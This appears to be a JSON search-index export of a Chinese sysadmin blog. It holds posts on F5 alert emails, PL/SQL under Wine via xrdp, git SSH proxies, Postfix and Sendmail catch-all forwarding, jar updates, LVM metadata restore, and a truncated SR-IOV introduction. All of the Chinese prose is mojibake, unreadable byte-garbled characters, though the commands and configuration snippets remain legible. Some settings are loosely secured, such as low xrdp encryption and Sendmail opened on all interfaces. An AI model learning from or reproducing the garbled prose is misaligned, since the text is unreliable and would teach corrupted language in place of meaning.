å­é‡Œçš„æˆå‘˜å¦‚æœç¦»çº¿ï¼Œå°±å‘é€å‘Šè­¦é‚®ä»¶ï¼Œå¦‚æœåˆæ¢å¤äº†ï¼Œä¹Ÿå‘å‘Šè­¦é‚®ä»¶ã€‚\né¦–å…ˆæˆ‘ä»¬éœ€è¦åœ¨å†…ç½‘ä¸­è®¾ç½®ä¸€ä¸ªé‚®ä»¶å‘é€æœåŠ¡å™¨ï¼Œæˆ‘ä»¬ç”¨çš„æ˜¯qqçš„ä¼ä¸šé‚®ç®±ï¼Œå¦‚ä½•è®¾ç½®åœ¨ä¹‹å‰è¯´è¿‡ï¼Œè¿™é‡Œè®¾ç½®çš„æ˜¯å†…ç½‘ç”¨è¿™å°æœåŠ¡å™¨å‘é‚®ä»¶ä¸éœ€è¦éªŒè¯ï¼Œä½†æ˜¯å‘é€è€…å¿…é¡»æ˜¯monit@company.comã€‚\nå…ˆæ¥ç¡®è®¤f5çš„ç‰ˆæœ¬ï¼Œä¸åŒçš„ç‰ˆæœ¬ä¸ä¸€å®šé€šç”¨æ’’ã€‚è¿™é‡Œç‰ˆæœ¬æ˜¯11.5.3æ‰å¯ä»¥ã€‚\nç™»å½•F5(ipæ˜¯172.16.0.1)ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬ï¼Œæ˜¯ä¸æ˜¯11.5.3\n1$ ssh user@172.16.0.1 2# tmsh show /sys version 3... 4 Product BIG-IP 5 Version 11.5.3 6... 7# quit ç¼–è¾‘/etc/ssmtp/ssmtp.confï¼Œè®¾ç½®é‚®ä»¶æœåŠ¡å™¨\n1# vi /etc/ssmtp/ssmtp.conf 2mailhub=192.168.0.1 3 4# å¦‚æœæ²¡æœ‰å®‰è£…å†…ç½‘çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œå¯ä»¥åœ¨è¿™é‡Œè®¾ç½®ã€‚å®‰è£…äº†å°±ä¸ç”¨è®¾ 5FromLineOverride=YES 6UseTLS=yes 7AuthUser=smtp_account 8AuthPass=password è®¾ç½®å‘Šè­¦å†…å®¹ï¼š\n1alert BIGIP_MCPD_MCPDERR_POOL_MEMBER_MON_DOWN \u0026#34;Pool (.*?) member (.*?):(.*?) monitor status down.\u0026#34; { 2 email toaddress=\u0026#34;user01@company.com,user02@company.com\u0026#34; 3 fromaddress=\u0026#34;monit@company.com\u0026#34; 4 body=\u0026#34;A pool member went down\u0026#34; 5} 6 7alert BIGIP_MCPD_MCPDERR_POOL_MEMBER_MON_UP \u0026#34;Pool (.*?) member (.*?):(.*?) monitor status up.\u0026#34; { 8 email toaddress=\u0026#34;user01@company.com,user02@company.com\u0026#34; 9 fromaddress=\u0026#34;monit@company.com\u0026#34; 10 body=\u0026#34;A pool member went up\u0026#34; 11} okï¼Œæå®šã€‚ä¸ç”¨é‡å¯ä»€ä¹ˆçš„å•Šï¼Œå³æ—¶ç”Ÿæ•ˆã€‚\n","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-f5_alert/","series":null,"tags":null,"title":"F5-Bigipçš„Load Balanceå‘Šè­¦é‚®ä»¶è®¾ç½®"},{"categories":null,"content":"è¿™çœŸæ˜¯ä¸ªæ— æ¯”å¤æ€ªçš„å®¡è®¡éœ€æ±‚ï¼Œéœ€è¦è®©ä¸€äº›åŒäº‹èƒ½è®¿é—®oracleï¼Œä½†æ˜¯ä¸å…è®¸ä»–ä»¬é€šè¿‡å‰ªåˆ‡æ¿æ‹·è´æ•°æ®ã€‚\nè¿™åªèƒ½æ˜¯kvm+Ubuntu+xrdp+wine+plsqlæ¥å®ç°äº†ï¼ˆCentOSåº”è¯¥ä¹Ÿæ²¡é—®é¢˜ï¼‰\né¦–å…ˆå‡†å¤‡ubuntuçš„isoï¼Œé€‰ç²¾ç®€çš„serverç‰ˆï¼Œæ¡Œé¢æ‰‹åŠ¨è£…ï¼š\n1wget http://mirrors.163.com/ubuntu-releases/12.04/ubuntu-12.04.5-server-i386.iso ç”Ÿæˆkvmè™šæœºç£ç›˜ï¼š\n1qemu-img create -f qcow2 /home/kvm/ubuntu.qcow2 20G å®‰è£…kvmè™šæœºï¼š\n1virt-install \\ 2 --name=ubuntu \\ 3 --vcpu=1 \\ 4 --ram=2048 \\ 5 --disk path=/home/kvm/ubuntu.qcow2,format=qcow2,size=20 \\ 6 --cdrom=/home/kvm/ubuntu-12.04.5-server-i386.iso \\ 7 --os-type=linux \\ 8 --network bridge=br0 \\ 9 --vnc --vnclisten=0.0.0.0 --vncport=5901 è¿™æ—¶å€™å°±è¦è¿åˆ°å®æœºçš„vnc 5901ç«¯å£ï¼Œå¼€å§‹å®‰è£…ã€‚åæ­£æ˜¯åªè¦ç”¨plsqlçš„ï¼Œæ‰€ä»¥ç¼ºçœéƒ½å¯ã€‚è®°ä½è¦è£…ä¸Šsshd serverï¼Œä¾¿äºè¿œç¨‹ç®¡ç†ã€‚\nè£…ubuntuæ—¶ä¼šæç¤ºç”Ÿæˆä¸€ä¸ªérootç”¨æˆ·ï¼Œå°±å«plsqlå¥½äº†ã€‚\nå®‰è£…ä¸è¡¨ï¼Œå®‰è£…å¥½äº†ä»¥åå› ä¸ºè£…äº†sshdï¼Œæ‰€ä»¥å°±å¯ä»¥sshè¿œç¨‹æ“ä½œäº†ã€‚\nå®‰è£…wineï¼š\n1sudo apt-get install software-properties-common 2sudo add-apt-repository ppa:ubuntu-wine/ppa 3sudo apt-get update 4sudo apt-get install wine å®‰è£…xrdpå’Œgnome-shellä»¥åŠè¾“å…¥æ³•ï¼š\n1sudo apt-get install xrdp 2sudo apt-get install gnome-shell 3sudo apt-get install ibus 4sudo apt-get install fcitx-table-wbpy è®¾ç½®xrdpç”±gnome-sessionæ§åˆ¶ï¼š\n1#vi /etc/xrdp/startwm.sh 2... 3#åŠ ä¸€è¡Œï¼Œç”¨gnome-sessionæ§åˆ¶ 4echo \u0026#34;gnome-session --session=gnome-classic\u0026#34; \u0026gt; .xsession 5. /etc/X11/Xsession 6... è®¾ç½®xrdpçš„ç™»å½•ï¼Œå»æ‰å…¶å®ƒä¸éœ€è¦çš„ç™»å½•æ–¹å¼ï¼Œåªç•™ä¸€ç§å¹¶æ”¹åï¼š\n1# vi /etc/xrdp/xrdp.ini 2[globals] 3bitmap_cache=yes 4bitmap_compression=yes 5port=3389 6crypt_level=low 7channel_code=1 8 9[xrdp1] 10name=plsql server 11lib=libvnc.so 12username=ask 13password=ask 14ip=127.0.0.1 15port=-1 ok, å…ˆè¿è¡Œä¸€ä¸‹wineï¼Œç”Ÿæˆç›®å½•ç»“æ„ä»¥åŠæ³¨å†Œè¡¨æ–‡ä»¶\n1wine regedit åœ¨sshç»ˆç«¯è¿è¡Œä»¥ä¸Šçš„å‘½ä»¤ä¼šé€€å‡ºï¼Œä¸è¦ç´§ï¼Œé€€å‡ºæ—¶å…¶å®ç›®å½•ç»“æ„å’Œæ³¨å†Œè¡¨æ–‡ä»¶å·²ç»ç”Ÿæˆå¥½äº†ã€‚\næˆ‘ä»¬ç¼–è¾‘ä¸€ä¸‹æ³¨å†Œè¡¨ï¼Œæ”¹åŠ¨ä¸€ä¸‹PATHå¹¶ä¸”æ·»åŠ 2ä¸ªç¯å¢ƒå˜é‡ï¼š\n1vi ~/.wine/system.reg 2... 3[System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment] 1464861672 4\u0026#34;ComSpec\u0026#34;=str(2):\u0026#34;C:\\\\windows\\\\system32\\\\cmd.exe\u0026#34; 5\u0026#34;NUMBER_OF_PROCESSORS\u0026#34;=\u0026#34;1\u0026#34; 6\u0026#34;ORACLE_HOME\u0026#34;=\u0026#34;c:\\\\oracle\u0026#34; 7\u0026#34;OS\u0026#34;=\u0026#34;Windows_NT\u0026#34; 8\u0026#34;PATH\u0026#34;=str(2):\u0026#34;c:\\\\oracle\\\\bin;C:\\\\windows\\\\system32;C:\\\\windows;C:\\\\windows\\\\system32\\\\wbem\u0026#34; 9\u0026#34;PATHEXT\u0026#34;=\u0026#34;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH\u0026#34; 10\u0026#34;PROCESSOR_ARCHITECTURE\u0026#34;=\u0026#34;x86\u0026#34; 11\u0026#34;PROCESSOR_IDENTIFIER\u0026#34;=\u0026#34;x86 Family 6 Model 13 Stepping 3, GenuineIntel\u0026#34; 12\u0026#34;PROCESSOR_LEVEL\u0026#34;=\u0026#34;6\u0026#34; 13\u0026#34;PROCESSOR_REVISION\u0026#34;=\u0026#34;0d03\u0026#34; 14\u0026#34;SystemDrive\u0026#34;=\u0026#34;c:\u0026#34; 15\u0026#34;SYSTEMROOT\u0026#34;=\u0026#34;C:\\\\windows\u0026#34; 16\u0026#34;TEMP\u0026#34;=str(2):\u0026#34;C:\\\\windows\\\\temp\u0026#34; 17\u0026#34;TMP\u0026#34;=str(2):\u0026#34;C:\\\\windows\\\\temp\u0026#34; 18\u0026#34;TNS_ADMIN\u0026#34;=\u0026#34;c:\\\\oracle\\\\network\\\\admin\u0026#34; 19\u0026#34;windir\u0026#34;=str(2):\u0026#34;C:\\\\windows\u0026#34; 20\u0026#34;winsysdir\u0026#34;=\u0026#34;C:\\\\windows\\\\system32\u0026#34; 21... æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸¤è¡ŒTNSADMINå’ŒORACLE_HOMEï¼Œå¹¶ä¿®æ”¹äº†PATHï¼Œæ€»å…±ä¸‰ä¸ªåœ°æ–¹ã€‚\næˆ‘ä»¬å†ä¸‹è½½oracleçš„å®¢æˆ·ç«¯ï¼Œbasicçš„å³å¯ï¼Œå¹¶è§£å‹åˆ°æŒ‡å®šåœ°æ–¹ï¼š\n1mkdir -p ~/.wine/drive_c/oracle/network/admin 2wget http://eservice.yru.ac.th/d/instantclient-basic-nt-11.2.0.4.0.zip -o /tmp/instantclient-basic-nt-11.2.0.4.0.zip 3cd ~/.wine/drive_c/oracle 4unzip -x /tmp/instantclient-basic-nt-11.2.0.4.0.zip 5mv instantclient_11_2 bin okï¼Œå¤§ç¯å¢ƒå°±å‡†å¤‡å¥½äº†ã€‚\nä¸‹è½½plsql\n1mkdir ~/Desktop 2 3#ä¸‹å¥½plsqldev904.exe 4mv plsqldev904.exe ~/Desktop 5wget http://www.rendoumi.com/soft/plsql.icon -o /etc/plsq.icon ç„¶åç”¨è¿œç¨‹æ¡Œé¢ç™»å½•è¿™å°æœºå™¨ ç›´æ¥ä¼šçœ‹åˆ°æ¡Œé¢ä¸Šæœ‰ä¸ªexe åŒå‡»æ‰§è¡Œï¼Œå°±å¼€å§‹å®‰è£…äº† ç„¶åI Agreeï¼Œéƒ½æŒ‰ç¼ºçœçš„å®‰è£…å³å¯ è£…å®Œåï¼Œå°±ç›´æ¥æŠŠè¿™ä¸ªplsql.exeåˆ é™¤å³å¯\nç„¶åç”Ÿæˆä¸ªæ¡Œé¢å¿«æ·æ–¹å¼ï¼š\n1# vi ~/Desktop/PLSQL\\ Developer.desktop 2[Desktop Entry] 3Name=PLSQL Developer 4Exec=wine \u0026#34;/home/plsql/.wine/dosdevices/c:/Program Files/PLSQL Developer/plsqldev.exe\u0026#34; 5Path=/home/plsql/.wine/dosdevices/c:/Program Files/PLSQL Developer 6Icon=/etc/plsql.icon 7Type=Application 8Categories=Wine; è¿™æ—¶å€™å›åˆ°è¿œç¨‹æ¡Œé¢ï¼Œå·²ç»å¯ä»¥çœ‹åˆ°æ¡Œé¢ä¸Šå¤šäº†ä¸ªç™½è‰²çš„ä¸œè¥¿ï¼š å³é”®ç‚¹å‡»ï¼Œæ‰“å¼€Propertiesï¼š æŠŠAllow executing file as programç»™å‹¾ä½ï¼Œå›¾è¡¨ä¹Ÿæ˜¾ç¤ºå‡ºæ¥äº† okï¼Œå¼„å¥½äº†ï¼Œæœ€åè¿è¡Œå³å¯ï¼Œæ˜¯å¯ä»¥è¾“å…¥æ±‰å­—çš„ï¼š\næœ€åè¡¥å……ä¸€ä¸‹ï¼Œtnsnames.oraæ˜¯æ”¾åœ¨ä¸‹é¢è¿™ä¸ªç›®å½•ä¸‹çš„ï¼š\n1~/.wine/drive_c/oracle/network/admin ","date":"2024-01-18","img":"","permalink":"https://rendoumi.com/posts/20240118-plsql_linux/","series":null,"tags":null,"title":"åœ¨Ubuntuä¸Šè£…ä¸ªplsqlé€šè¿‡è¿œç¨‹æ¡Œé¢è®¿é—®oracle"},{"categories":null,"content":"ä¸‡ä¸‡æ²¡æƒ³åˆ°å•Šï¼Œgithubè¢«å°è½®åˆ°è‡ªå·±å¤´ä¸Šäº†ã€‚\nè¿™ä¸ªåšå®¢æ˜¯åœ¨windowsä¸‹ç”¨Typoraå†™çš„ï¼Œç„¶åhugoç”Ÿæˆï¼Œç›´æ¥ç”¨git for windowsæäº¤ï¼Œä»Šå¤©gitæ— æ³•æäº¤äº†ã€‚\nå¿…é¡»è®¾ç½®ä¸€ä¸‹git sshçš„ä»£ç†äº†ï¼Œæˆ‘ç”¨çš„æ˜¯socks5ã€‚\nåœ¨C:\\Users\\username\\.ssh\\configæ–‡ä»¶ä¸­æ·»åŠ ç›¸å…³é…ç½®ï¼Œå¦‚æœæ²¡æœ‰configæ–‡ä»¶éœ€è¦æ‰‹åŠ¨åˆ›å»ºï¼Œconnectå‘½ä»¤æ˜¯git Windowså®¢æˆ·ç«¯git for windowsè‡ªå¸¦çš„, ä½äº\u0026lt;Git-install-path\u0026gt;\\mingw64\\bin\\connect.exe\nsocksä»£ç†æ·»åŠ ä»¥ä¸‹é…ç½®\n1Host github.com(æ”¹æˆä½ çš„ç«™ç‚¹) 2ProxyCommand connect -S 127.0.0.1:1080 %h %p å¯ä»¥é…ç½®å¤šä¸ªç½‘ç«™Host\n1Host github.com(æ”¹æˆä½ çš„ç«™ç‚¹) 2ProxyCommand connect -S 127.0.0.1:1080 %h %p 3 4Host bitbucket.org(æ”¹æˆä½ çš„ç«™ç‚¹) 5ProxyCommand connect -S 127.0.0.1:1080 %h %p å¦‚æœHostè®¾ç½®ä¸º*ï¼Œä»£ç†ä¼šå¯¹æ‰€æœ‰æœªé…ç½®çš„Hostèµ·ä½œç”¨ã€‚ä»¥ä¸‹æœ‰ä¸‰é¡¹é…ç½®ï¼Œè®¿é—®githubä½¿ç”¨ç¬¬äºŒé¡¹é…ç½®ï¼Œè®¿é—®bitbucketä½¿ç”¨ç¬¬ä¸‰é¡¹é…ç½®ï¼Œå…¶å®ƒç½‘ç«™ä½¿ç”¨ç¬¬ä¸€é¡¹é…ç½®\n1Host * 2 ProxyCommand \u0026#34;C:/Program Files/Git/mingw64/bin/connect.exe\u0026#34; -H 127.0.0.1:1080 %h %p 3 IdentityFile \u0026#34;C:/Users/bybon/.ssh/id_rsa\u0026#34; 4 TCPKeepAlive yes 5 IdentitiesOnly yes 6 7Host github.com 8 ProxyCommand connect -S 127.0.0.1:1080 %h %p 9 10Host bitbucket.com 11 ProxyCommand connect -S 127.0.0.1:1080 %h %p ","date":"2024-01-17","img":"","permalink":"https://rendoumi.com/posts/20240117-git_proxy/","series":null,"tags":null,"title":"è®¾ç½®git Sshä»£ç†"},{"categories":null,"content":"Postfixè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹ ç”³è¯·äº†ä¸€ä¸ªyi.zapto.orgçš„å…è´¹åŸŸåï¼Œæƒ³æŠŠ*@yi.zapto.orgçš„é‚®ä»¶åœ°å€éƒ½é€åˆ°zrr@yi.zapto.orgè¿™ä¸ªåœ°å€å»ã€‚\nç”¨Postfixæ¥åšï¼š\nç¼–è¾‘main.cfï¼Œè®¾ç½®é‚®ä»¶çš„åŸŸåï¼Œå¯¹äº†ï¼Œæœ€å¥½åœ¨/etc/hostsä¸­å¢åŠ yi.zapto.orgåŸŸåçš„è§£æã€‚\n1# vi /etc/postfix/main.cf 2... 3 4inet_interfaces = all 5mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain, yi.zapto.org 6virtual_alias_maps = hash:/etc/postfix/virtual 7... ç¼–è¾‘virtualï¼Œè®¾ç½®å…¨åŸŸé‚®ä»¶è½¬å‘åˆ°zrr\n1# vi /etc/postfix/virtual 2@yi.zapto.org zrr 3# postmap /etc/virtual å¦‚æœæœ‰å¤šä¸ªåŸŸåï¼Œé‚£ä¹ˆåœ¨mydestinationæœ€åä¾æ¬¡æ·»åŠ ï¼Œå¹¶ä¸”ä¿®æ”¹virtualå¹¶é‡æ–°hashå³å¯ã€‚\nokï¼Œé‡å¯postfix\n1service postfix restart Sendmailè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹ ç”¨Sendmailæ¥åšï¼š\nç¼–è¾‘local-host-namesï¼Œè®¾ç½®é‚®ä»¶çš„åŸŸåï¼Œå¯¹äº†ï¼Œæœ€å¥½åœ¨/etc/hostsä¸­å¢åŠ yi.zapto.orgçš„è§£æï¼Œå¦åˆ™sendmailå¯åŠ¨æ—¶ä¼šåè§£ï¼Œé€Ÿåº¦å¾ˆæ…¢ã€‚\n1# vi /etc/mail/local-host-names 2yi.zapto.org ç¼–è¾‘virtusertableï¼Œè®¾ç½®å…¨åŸŸé‚®ä»¶è½¬å‘åˆ°zrr\n1# vi /etc/virtusertable 2@yi.zapto.org zrr 3# rm /etc/virtusertable.db 4# cd /etc/mail 5# make ç¼–è¾‘sendmail.cfï¼Œå¢åŠ ä¿¡ä»»ç”¨æˆ·nobody\n1# vi /etc/mail/sendmail.cf 2... 3##################### 4# Trusted users # 5##################### 6 7# this is equivalent to setting class \u0026#34;t\u0026#34; 8Ft/etc/mail/trusted-users 9Troot 10Tdaemon 11Tuucp 12Tnobody 13... è¿™æ ·æ‰€æœ‰å‘è¿‡æ¥çš„é‚®ä»¶éƒ½ä¼šè‡ªåŠ¨è½¬å‘åˆ°zrrè¿™ä¸ªè´¦å·ä¸‹ã€‚\nç¼–è¾‘sendmail.cfï¼Œå¼€æ”¾ç«¯å£ï¼Œå¦åˆ™åªèƒ½127.0.0.1æ”¶å‘é‚®ä»¶\n1... 2#O DaemonPortOptions=Port=smtp,Addr=127.0.0.1, Name=MTA 3O DaemonPortOptions=Port=smtp,Addr=0.0.0.0, Name=MTA 4... okï¼Œé‡å¯sendmail\n1service sendmail restart ","date":"2024-01-17","img":"","permalink":"https://rendoumi.com/posts/20240117-mail_forward/","series":null,"tags":null,"title":"Postfixå’ŒSendmailè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹"},{"categories":null,"content":"jaråŒ…å¯ä»¥å½“ä½œä¸€ä¸ªzipåŒ…æ¥çœ‹å¾…ã€‚\njaræ–‡ä»¶ï¼š/home/resin.jar éœ€è¦æ›´æ–°åŒ…ä¸­com/caucho/server/port/Port.classç±»æ–‡ä»¶\næ–¹æ³•1ï¼Œç›´æ¥æ›´æ–°ï¼š\n1æŸ¥çœ‹jaråŒ…çš„æ–‡ä»¶ç›®å½•ç»“æ„ 2jar tf resin.jar 3 4æ›´æ–°æŒ‡å®šå†…å®¹ 5jar uf resin.jar com/caucho/server/port/Port.class 6jar uf testRedis-33.jar redis.properties æ–¹æ³•2ï¼Œè§£å‹æ›¿æ¢åå†æ‰“åŒ…ï¼š\n1è§£å‹åŒ…ï¼š 2mkdir new 3cd new 4jar xvf ../testRedis-33.jar 5 6è¿›è¡Œä¿®æ”¹ 7vi redis.properties 8 9é‡æ–°å‹åŒ… 10jar cmvf META-INF/MANIFEST.MF t.jar * ","date":"2024-01-17","img":"","permalink":"https://rendoumi.com/posts/20240117-jar_update/","series":null,"tags":null,"title":"æ›´æ–°jaråŒ…æˆ–è€…jaråŒ…ä¸­çš„æ–‡ä»¶"},{"categories":null,"content":"æ€€å¿µæ°¸è¿œçš„freashmeat è¿™ä¸ªç½‘ç«™æ˜¯ä»ä¸€å¼€ç«™å°±å…³æ³¨çš„ï¼ŒåŸºæœ¬ä¸Šå¤©å¤©éƒ½çœ‹ï¼Œæœ‰10å‡ å¹´äº†ã€‚\næŒç»­åˆ°2014å¹´6æœˆ18æ—¥ï¼Œæ°¸ä¹…çš„å°ç«™äº†ã€‚\næ—¶ä¸æ—¶çš„ï¼Œä»ä¼šæ‰“å¼€è¿™ä¸ªç½‘é¡µï¼Œé€¡å·¡è‰¯ä¹…ï¼ï¼ï¼ï¼Œæ—¶å…‰èè‹’ï¼Œ2024å¹´äº†ï¼Œå…³ç«™éƒ½è¦10å¹´äº†ã€‚çºªå¿µä¸€ä¸‹ï¼\n","date":"2024-01-16","img":"","permalink":"https://rendoumi.com/posts/20240106-freshmeat_forever/","series":null,"tags":null,"title":"æ€€å¿µæ°¸è¿œçš„freshmeat.net"},{"categories":null,"content":"è¿™æ˜¯ä¸ªåé¢æ•™æã€‚åœ¨äº¬ä¸œæ•°ç§‘çš„æ—¶å€™ç”¨çš„æ˜¯kvmçš„è™šæœºç³»ç»Ÿï¼ŒåŒäº‹è¿½æ±‚æ›´å¿«ï¼Œæ–‡ä»¶é•œåƒç”¨çš„æ˜¯rawåˆ†åŒºï¼Œé‡Œé¢è£…äº†lvmã€‚\ngrubçš„å¯åŠ¨æ–‡ä»¶å¦‚ä¸‹ï¼š\n1 kernel /vmlinuz-2.6.32-431.el6.x86_64 ro root=/dev/mapper/vg_root-lvroot rd_NO_LUKS rd_LVM_LV=vg_root/lvroot LANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 console=ttyS0,115200n8 rd_LVM_LV=vg_root/lvswap KEYBOARDTYPE=pc KEYTABLE=us crashkernel=auto rhgb quiet rd_NO_DM çœ‹ä¸Šé¢ï¼Œrootä¹Ÿè¢«å»ºç«‹åœ¨lvrootçš„lvmå·ä¸Šäº†ã€‚\nç„¶åå°±é‡åˆ°äº†æ–­ç”µï¼Œå¯¼è‡´kvmæŒ‚æ‰äº†ï¼Œæ‚²å‚¬çš„æ˜¯lvmå·è¢«ç ´åäº†ï¼Œç”¨å°½åŠæ³•ä¹Ÿå¼„ä¸å‡ºæ¥å·ä¿¡æ¯ã€‚å› ä¸ºlvmçš„metadataæ²¡æœ‰å¤‡ä»½ã€‚\næ•°æ®å…¨ä¸¢ï¼Œæ— æ³•æ¢å¤ï¼Œæ¯å…·äº†ã€‚\nç»¼ä¸ŠLVMçš„metadataå¿…é¡»å¤‡ä»½ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\n1vgcfgbackup /etc/lvm/backup/VolGroupæ˜¯å½“å‰lvmé…ç½®çš„ä¸€ä¸ªå¤‡ä»½ï¼Œè€Œ/etc/lvm/archiveæ˜¯å½’æ¡£ã€‚\nçœ‹çœ‹å½’æ¡£ï¼š\n1ls -l /etc/lvm/archive/* 2-rw-------. 1 root root 1820 Jun 12 2015 /etc/lvm/archive/VolGroup_00000-444365108.vg æ¢å¤æ–¹æ³•ï¼š\n1vgcfgrestore å…·ä½“æ¢å¤çš„æ­¥éª¤ï¼š é¦–å…ˆæŸ¥çœ‹blkidï¼Œçœ‹çœ‹ç¡¬ç›˜åˆ†åŒºçš„UUID\n1blkid 2/dev/mapper/VolGroup-LogVol01: UUID=\u0026#34;d6d24cc3-5e4a-4f4d-a0b1-2524e727b0fe\u0026#34; TYPE=\u0026#34;ext4\u0026#34; 3/dev/sda1: UUID=\u0026#34;3d0103ac-1b18-4da5-bc20-4b7a980a55c0\u0026#34; TYPE=\u0026#34;ext4\u0026#34; 4/dev/sda2: UUID=\u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34; TYPE=\u0026#34;LVM2_member\u0026#34; 5/dev/mapper/VolGroup-LogVol00: UUID=\u0026#34;06fe7af0-dee5-494a-9b5b-11bf95244acd\u0026#34; TYPE=\u0026#34;swap\u0026#34; æŸ¥çœ‹lvmä¿¡æ¯ï¼Œæ‰¾å‡ºé‡Œé¢æ‰€æœ‰ç‰©ç†å·çš„UUIDï¼š\n1less /etc/lvm/archive/VolGroup_00000-444365108.vg 2... 3 physical_volumes { 4 5 pv0 { 6 id = \u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34; 7 device = \u0026#34;/dev/sda2\u0026#34; # Hint only 8... é¦–å…ˆæ¢å¤æ‰€æœ‰çš„pvï¼Œç‰©ç†å·ï¼Œè¿™é‡Œæˆ‘ä»¬å°±ä¸€ä¸ªç‰©ç†å·ï¼Œæ‰€ä»¥æ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœæœ‰å¤šä¸ªç‰©ç†å·ï¼Œä¸€ä¸ªä¸€ä¸ªæ¥å³å¯\n1pvcreate --uuid \u0026#34;i5Cd6V-IVHN-e694-o9CQ-OZJe-zvt0-AhUBLq\u0026#34; \\ 2 --restorefile /etc/lvm/archive/VolGroup_00000-444365108.vg ç‰©ç†å·æ¢å¤å®Œäº†ï¼Œå†æ¢å¤lvï¼Œé€»è¾‘å·ï¼š\n1vgcfgrestore -f /etc/lvm/archive/VolGroup_00000-444365108.vg VolGroup å¼„å®ŒåvgdisplayæŸ¥çœ‹ä¸€ä¸‹ï¼š\n1vgdisplay 2 --- Volume group --- 3 VG Name VolGroup 4 System ID 5 Format lvm2 6 Metadata Areas 1 7 Metadata Sequence No 9 8 VG Access read/write 9 VG Status resizable 10 MAX LV 0 11 Cur LV 2 12 Open LV 2 13 Max PV 0 14 Cur PV 1 15 Act PV 1 16 VG Size 1.64 TiB 17 PE Size 4.00 MiB 18 Total PE 428705 19 Alloc PE / Size 428705 / 1.64 TiB 20 Free PE / Size 0 / 0 21 VG UUID 3h3yik-kmqP-Q8sC-5bn0-cwtw-SXpo-orMlKn å°±æ¢å¤æˆåŠŸäº†ã€‚\n","date":"2024-01-16","img":"","permalink":"https://rendoumi.com/posts/20240116-lvm_metadata/","series":null,"tags":null,"title":"LVMå·å¿…é¡»å¤‡ä»½metadata"},{"categories":null,"content":"ä»€ä¹ˆæ˜¯SR-IOVå‘¢?\nç®€å•çš„è¯´ï¼ŒSR-IOVæ˜¯ä¸€ç§è™šæ‹ŸåŒ–æ–¹æ¡ˆï¼Œç”¨æ¥ä½¿ä¸€ä¸ªPCIeçš„ç‰©ç†è®¾å¤‡ï¼Œèƒ½è™šæ‹Ÿå‡ºå¤šä¸ªè®¾å¤‡ï¼Œè¿™äº›è™šæ‹Ÿå‡ºæ¥çš„è®¾å¤‡çœ‹èµ·æ¥å°±åƒæ˜¯å¤šä¸ªçœŸå®çš„ç‰©ç†è®¾å¤‡ä¸€æ ·ï¼Œå¹¶è·å¾—èƒ½å¤Ÿä¸æœ¬æœºæ€§èƒ½åª²ç¾çš„ I/O æ€§èƒ½ã€‚\nSR-IOVç°åœ¨æœ€å¤šæ˜¯ç”¨åœ¨ç½‘å¡ä¸Šï¼Œkvmè™šæ‹Ÿæœºçš„ç½‘å¡åŠŸèƒ½ä¸€èˆ¬ä¼šä¸‹é™åˆ°å®ä½“æœºçš„30-50%ï¼Œå¦‚æœæ”¹ç”¨SR-IOVä¼šå¤§å¤§æé«˜ç½‘å¡æ€§èƒ½ã€‚\nSR-IOV æœ‰2ç§åŠŸèƒ½ï¼š\nç‰©ç†åŠŸèƒ½ (Physical Function, PF) å°±æ˜¯æ ‡å‡†çš„PCIeçš„åŠŸèƒ½äº† è™šæ‹ŸåŠŸèƒ½ (Virtual Function, VF) ä¸ç‰©ç†åŠŸèƒ½å…³è”çš„ä¸€ç§åŠŸèƒ½ã€‚VF æ˜¯ä¸€ç§è½»é‡çº§ PCIe åŠŸèƒ½ï¼Œå¯ä»¥ä¸ç‰©ç†åŠŸèƒ½ä»¥åŠä¸åŒä¸€ç‰©ç†åŠŸèƒ½å…³è”çš„å…¶ä»– VF å…±äº«ä¸€ä¸ªæˆ–å¤šä¸ªç‰©ç†èµ„æºã€‚VF ä»…å…è®¸æ‹¥æœ‰ç”¨äºå…¶è‡ªèº«è¡Œä¸ºçš„é…ç½®èµ„æºã€‚ å¥½çš„ï¼Œå¦‚ä½•åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨å®ƒå‘¢ï¼Ÿ\nåœºæ™¯å¦‚ä¸‹ï¼š å¦‚ä¸Šï¼š æœºæˆ¿é‡Œæœ‰ä¸¤å°äº¤æ¢æœº:\nswitch-1ç”¨æ¥è¿æ¥å„æœºå™¨çš„eth0å£ switch-2ç”¨æ¥è¿æ¥å„æœºå™¨çš„eth1å£ switch-1å’Œswitch-2äº’è” è¿™æ˜¯ä¸€ç§æœºæˆ¿çš„æ ‡å‡†è¿æ³•ï¼Œeth0å’Œeth1åšbondingï¼Œåšçº¿è·¯å†—ä½™ server-2æ˜¯ä¸€å°Dell R730çš„æœåŠ¡å™¨ï¼Œeth0è¿switch-1ï¼Œeth1è¿switch-2ï¼Œä¸Šé¢è·‘äº†ä¸‰ä¸ªè™šæœºï¼š\nVM-1è·‘åœ¨åŸºäºbondingçš„Bridgeä¸Šï¼Œæ ‡å‡†çš„åšæ³• VM-2å’ŒVM-2åˆ™æ˜¯åˆ©ç”¨äº†SR-IOVï¼Œä»è™šæ‹Ÿç½‘å¡ç›´è¿åˆ°ç‰©ç†ç½‘å¡ï¼Œå‡å°‘äº†ä¸­é—´ç¯èŠ‚ï¼Œæé«˜äº†ç½‘å¡çš„æ•ˆç‡ã€‚ é¦–å…ˆè¦æŠŠæœåŠ¡å™¨çš„vtå’Œsr-iovæ‰“å¼€ï¼š\nSystem BIOS \u0026gt; Processor Settings \u0026gt; Virtualization Technology\nSystem BIOS \u0026gt; 